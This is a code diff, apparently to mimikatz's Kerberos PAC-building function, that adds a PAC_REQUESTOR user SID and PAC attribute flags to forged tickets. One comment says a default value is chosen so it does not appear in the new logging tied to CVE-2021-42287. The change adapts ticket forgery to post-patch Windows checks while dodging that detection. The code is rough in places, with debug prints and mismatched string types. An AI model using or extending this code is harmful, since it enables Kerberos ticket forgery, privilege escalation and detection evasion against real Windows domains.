@@ -5,7 +5,7 @@
 */
 #include "kuhl_m_kerberos_pac.h"
 
-BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFILETIME authtime, LPCWSTR clientname, LONG SignatureType, PCLAIMS_SET pClaimsSet, PISID sid, PPACTYPE * pacType, DWORD * pacLength, wchar_t pacAttributeType)
+BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFILETIME authtime, LPCWSTR clientname, LONG SignatureType, PCLAIMS_SET pClaimsSet, PISID sid, DWORD userId, PPACTYPE * pacType, DWORD * pacLength)
 {
 	BOOL status = FALSE;
 	PVOID pLogonInfo = NULL, pClaims = NULL;
@@ -13,6 +13,7 @@ BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFIL
 	PAC_SIGNATURE_DATA signature = {SignatureType, {0}};
 	DWORD n = 6, szLogonInfo = 0, szLogonInfoAligned = 0, szClientInfo = 0, szClientInfoAligned, szClaims = 0, szClaimsAligned = 0, szSignature = FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature), szSignatureAligned, offsetData = sizeof(PACTYPE) + 5 * sizeof(PAC_INFO_BUFFER);
 	PKERB_CHECKSUM pCheckSum;
+	INT pacAttributeType = NULL; // Default to a value that doesnt show up on the new logs in CVE-2021-42287
 
 	if(NT_SUCCESS(CDLocateCheckSum(SignatureType, &pCheckSum)))
 	{
@@ -32,22 +33,47 @@ BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFIL
 			}
 
 
+		// Convert sid and id into user sid for PAC REQUESTOR
+		kprintf(L"\nDEBUG: Starting SID Conversion for PAC Requestor");
+		LPCWSTR stringSid;
+		ConvertSidToStringSid(sid, &stringSid);
+		kprintf(L"\nDEBUG: Converted SID to String");
+
+		char userStringSidFull[50];
+		kprintf(L"\nDEBUG: attempting first cpy ");
+		strcpy_s(userStringSidFull, sizeof(userStringSidFull), stringSid);
+		kprintf(L"\nDEBUG: attempting first join");
+		strcat_s(userStringSidFull, sizeof(userStringSidFull), "-");
+		kprintf(L"\nDEBUG: attempting dword join");
+		char userRid[10];
+		sprintf(userRid, "%d", userId);
+		strcat_s(userStringSidFull, sizeof(userStringSidFull), userRid);
+		
+		//kprintf(L"\nDEBUG: Joined String SIDs: %s", userStringSidFull);
+
+		PSID userSid;
+		ConvertStringSidToSid(userStringSidFull, &userSid);
+
+		kprintf(L"\nDEBUG: END User SID Conversion for PAC Requestor");
+
 		// Setting up PAC_REQUESTOR
 		PAC_REQUESTOR requestor;
-		requestor.sid = sid;
+		requestor.sid = userSid;
 		auto szPacRequestorsid = sizeof(PAC_REQUESTOR);
 		DWORD szPacRequestorSidAligned = SIZE_ALIGN(szPacRequestorsid, 8);
+
+		printf(L"PAC REQUESTOR DONE");
 
 		// Setting up PAC_ATTRIBUTE_IFNO
 		PAC_ATTRIBUTES_INFO pacAttributeInfo;
 		
 		// This takes the value of 1 or 2 from pacAttributeType Arguement and inputs it as correct format. I am sure this is terrible but I couldnt get it to work another way.
-		UINT32 pacAttributeTypeParser;
+		UINT32 pacAttributeTypeParser = NULL;
 		
-		if (pacAttributeType = "1") {
+		if (pacAttributeType == 1) {
 			pacAttributeTypeParser = PAC_ATTRIBUTE_FLAG_PAC_WAS_REQUESTED;
 		}
-		else if (pacAttributeType = "2") {
+		else if (pacAttributeType == 2) {
 			pacAttributeTypeParser = PAC_ATTRIBUTE_FLAG_PAC_WAS_GIVEN_IMPLICITLY;
 		}else{ 
 			pacAttributeTypeParser = NULL;
@@ -56,6 +82,9 @@ BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFIL
 		if (pacAttributeTypeParser) { 
 			kprintf(L"PAC Attribute Info: %zu\n", pacAttributeTypeParser);
 			pacAttributeInfo.Flags[0] = pacAttributeTypeParser; 
+		}
+		else {
+			kprintf(L"PAC Attribute Info: NULL");
 		}
 				
 
